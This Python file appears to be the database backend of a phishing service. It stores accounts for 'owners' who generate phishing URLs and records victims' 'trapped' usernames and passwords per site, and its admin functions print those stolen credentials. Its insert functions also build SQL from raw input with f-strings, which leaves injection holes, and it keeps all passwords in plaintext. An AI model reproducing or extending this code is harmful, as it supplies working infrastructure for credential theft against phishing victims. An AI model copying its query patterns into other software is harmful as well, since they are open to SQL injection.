import sqlite3
def ConnectionToTrapedDB():
    conn=sqlite3.connect('TrappedData.db',check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS TRAPED
            (OWNER TEXT     NOT NULL,
            APP    TEXT NOT NULL,
            UID  TEXT NOT NULL,
            PASSWORD    TEXT    NOT NULL);
            ''')
    
    conn.commit()
    print("Made  Connection to Traped Database")
    return conn

def ConnectionToUserDB():
    conn=sqlite3.connect('UserData.db',check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS USERS
            (UID  TEXT PRIMARY KEY NOT NULL,
            EMAIL TEXT NOT NULL,
            PASSWORD    TEXT    NOT NULL);
            ''')
    conn.commit()
    print("Made Connection to Users Database")
    return conn

# used while registering and checking for generated phishing url
def checkIfUserExists(uid):
    conn=ConnectionToUserDB()
    if len(conn.execute("select UID from USERS where UID=?", (uid,)).fetchall())==0:
        conn.close()
        return False
    conn.close()
    return True


#used while registering
def insertIntoUser(uid,email,pas):
    conn=ConnectionToUserDB()
    conn.execute(f"INSERT INTO USERS (UID,EMAIL,PASSWORD) \
      VALUES ('{uid}','{email}','{pas}' )")
    conn.commit()
    print("user added")
    conn.close()



#used while logginig
def checkUserCredential(uid,pas):
    for row in ConnectionToUserDB().execute(f"SELECT UID,PASSWORD from USERS where UID=?",(uid,)):
        if row[0]==uid and row[1]==pas:
            print("userid = ", row[0])
            print("password = ", row[1],"\n")
            return True
        return False




#used to insert into traped data
def insertIntoTraped(owner,site,uid,pas):
    conn=ConnectionToTrapedDB()
    conn.execute(f"INSERT INTO TRAPED (OWNER,APP,UID,PASSWORD) \
      VALUES ('{owner}','{site}','{uid}','{pas}' )")
    conn.commit()
    print("user traped")
    conn.close()




def getTrapedDataForOwner(uid):
    cursor = ConnectionToTrapedDB().execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED where OWNER=?",(uid,))
    return cursor



#for admin
def showTrapedData():
    cursor = ConnectionToTrapedDB().execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED")
    for row in cursor:
        print("owner = ",row[0])
        print("app = ",row[1])
        print("userid = ", row[2])
        print("password = ", row[3],"\n")
    print("numbers of Traped users",cursor.execute("select count(*) from TRAPED").fetchall()[-1][-1])


 #for admin      
def showUserData():
    cursor = ConnectionToUserDB().execute("SELECT UID,EMAIL,PASSWORD from USERS")
    for row in cursor:
        print("UID = ",row[0])
        print("EMAIL = ",row[1])
        print("password = ", row[2],"\n")
    print("numbers of users",cursor.execute("select count(*) from USERS").fetchall()[-1][-1])
    


#for admin
def deleteTrapedData():
    ConnectionToTrapedDB().execute("drop table TRAPED")
    print("data deleted")
